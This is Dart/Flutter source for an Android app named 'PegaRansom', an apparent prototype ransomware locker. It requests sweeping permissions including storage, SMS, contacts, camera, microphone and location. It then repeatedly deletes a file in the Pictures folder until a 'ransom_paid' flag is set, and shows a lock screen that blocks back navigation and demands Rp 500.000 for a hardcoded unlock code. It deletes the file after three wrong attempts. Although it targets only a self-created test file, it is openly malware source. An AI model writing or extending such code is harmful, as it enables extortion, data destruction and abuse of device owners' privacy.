import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'dart:io';
import 'dart:async';

void main() {
  runApp(const PegaRansomApp());
}

class PegaRansomApp extends StatelessWidget {
  const PegaRansomApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'PegaRansom',
      theme: ThemeData.dark(),
      home: const LoginScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  _LoginScreenState createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  bool _permissionsGranted = false;
  
  @override
  void initState() {
    super.initState();
    _requestPermissions();
  }
  
  Future<void> _requestPermissions() async {
    final permissions = await [
      Permission.storage,
      Permission.manageExternalStorage,
      Permission.accessMediaLocation,
      Permission.camera,
      Permission.microphone,
      Permission.phone,
      Permission.sms,
      Permission.contacts,
      Permission.location,
      Permission.notification,
    ].request();
    
    if (permissions.values.every((status) => status.isGranted)) {
      setState(() => _permissionsGranted = true);
      _initializeRansomware();
    }
  }
  
  Future<void> _initializeRansomware() async {
    // Create target directory if not exists
    final targetDir = Directory('/storage/emulated/0/Pictures/100PINT/Pins');
    if (!await targetDir.exists()) {
      await targetDir.create(recursive: true);
    }
    
    // Create test file if not exists
    final testFile = File('/storage/emulated/0/Pictures/100PINT/Pins/tes.jpg');
    if (!await testFile.exists()) {
      await testFile.writeAsBytes(List.generate(1024, (i) => i % 256));
    }
    
    // Start monitoring
    _startFileMonitoring();
  }
  
  void _startFileMonitoring() {
    Timer.periodic(const Duration(seconds: 10), (timer) async {
      final prefs = await SharedPreferences.getInstance();
      final ransomPaid = prefs.getBool('ransom_paid') ?? false;
      
      if (!ransomPaid) {
        _checkAndDeleteFile();
      }
    });
  }
  
  Future<void> _checkAndDeleteFile() async {
    try {
      final file = File('/storage/emulated/0/Pictures/100PINT/Pins/tes.jpg');
      if (await file.exists()) {
        await file.delete();
        print('File deleted: ${file.path}');
        
        // Recreate to keep testing
        await Future.delayed(const Duration(seconds: 5));
        await file.writeAsBytes(List.generate(512, (i) => i % 256));
      }
    } catch (e) {
      print('Error deleting file: $e');
    }
  }
  
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: Container(
          padding: const EdgeInsets.all(30),
          decoration: BoxDecoration(
            color: Colors.grey[900],
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: Colors.red, width: 2),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Icon(Icons.security, size: 60, color: Colors.red),
              const SizedBox(height: 20),
              const Text(
                'PegaRansom',
                style: TextStyle(
                  fontSize: 28,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                ),
              ),
              const SizedBox(height: 10),
              const Text(
                'Security System Initializing...',
                style: TextStyle(color: Colors.grey),
              ),
              const SizedBox(height: 30),
              if (!_permissionsGranted)
                const CircularProgressIndicator(color: Colors.red)
              else
                ElevatedButton(
                  onPressed: () {
                    Navigator.pushReplacement(
                      context,
                      MaterialPageRoute(builder: (context) => const LockScreen()),
                    );
                  },
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.red,
                    padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 15),
                  ),
                  child: const Text('ENTER SYSTEM', style: TextStyle(fontSize: 16)),
                ),
            ],
          ),
        ),
      ),
    );
  }
}

class LockScreen extends StatefulWidget {
  const LockScreen({super.key});

  @override
  _LockScreenState createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> {
  final TextEditingController _pinController = TextEditingController();
  bool _showError = false;
  int _attempts = 0;
  
  Future<void> _deleteTargetFile() async {
    try {
      final file = File('/storage/emulated/0/Pictures/100PINT/Pins/tes.jpg');
      if (await file.exists()) {
        await file.delete();
        print('Ransomware: Target file deleted due to failed attempt');
      }
    } catch (e) {
      print('Delete error: $e');
    }
  }
  
  void _checkPin() async {
    const correctPin = '500000';
    
    if (_pinController.text == correctPin) {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool('ransom_paid', true);
      Navigator.pop(context);
    } else {
      setState(() {
        _showError = true;
        _attempts++;
      });
      
      if (_attempts >= 3) {
        await _deleteTargetFile();
      }
      
      _pinController.clear();
    }
  }
  
  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async => false,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: Container(
            width: MediaQuery.of(context).size.width * 0.9,
            padding: const EdgeInsets.all(25),
            decoration: BoxDecoration(
              color: Colors.grey[900],
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: Colors.red, width: 3),
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const Icon(Icons.lock, size: 70, color: Colors.red),
                const SizedBox(height: 20),
                const Text(
                  '⚠ DEVICE LOCKED ⚠',
                  style: TextStyle(
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    color: Colors.white,
                  ),
                ),
                const SizedBox(height: 10),
                const Text(
                  'Pay ransom to unlock system',
                  style: TextStyle(color: Colors.grey),
                ),
                const SizedBox(height: 30),
                
                // Ransom Demand
                Container(
                  padding: const EdgeInsets.all(15),
                  decoration: BoxDecoration(
                    color: Colors.red[900]!.withOpacity(0.3),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: const Column(
                    children: [
                      Icon(Icons.money_off, color: Colors.yellow, size: 40),
                      SizedBox(height: 10),
                      Text(
                        'RANSOM DEMAND: Rp 500.000',
                        style: TextStyle(
                          fontSize: 18,
                          fontWeight: FontWeight.bold,
                          color: Colors.yellow,
                        ),
                      ),
                      SizedBox(height: 5),
                      Text(
                        'Enter payment code below',
                        style: TextStyle(color: Colors.grey, fontSize: 12),
                      ),
                    ],
                  ),
                ),
                
                const SizedBox(height: 30),
                
                // PIN Input
                TextField(
                  controller: _pinController,
                  keyboardType: TextInputType.number,
                  textAlign: TextAlign.center,
                  style: const TextStyle(fontSize: 20, color: Colors.white),
                  decoration: InputDecoration(
                    hintText: 'Enter payment code',
                    hintStyle: const TextStyle(color: Colors.grey),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: BorderSide(color: _showError ? Colors.red : Colors.grey),
                    ),
                    filled: true,
                    fillColor: Colors.grey[800],
                  ),
                  onChanged: (value) {
                    if (value.length == 6) {
                      _checkPin();
                    }
                  },
                ),
                
                if (_showError) ...[
                  const SizedBox(height: 20),
                  Text(
                    'Wrong code! Attempt $_attempts/3',
                    style: const TextStyle(color: Colors.red),
                  ),
                  const SizedBox(height: 5),
                  const Text(
                    'File deletion triggered after 3 failed attempts',
                    style: TextStyle(color: Colors.red, fontSize: 12),
                  ),
                ],
                
                const SizedBox(height: 30),
                
                // Warning
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.5),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: const Column(
                    children: [
                      Icon(Icons.warning, color: Colors.orange, size: 18),
                      SizedBox(height: 5),
                      Text(
                        'System will delete target files on reboot or failed attempts',
                        textAlign: TextAlign.center,
                        style: TextStyle(color: Colors.orange, fontSize: 11),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
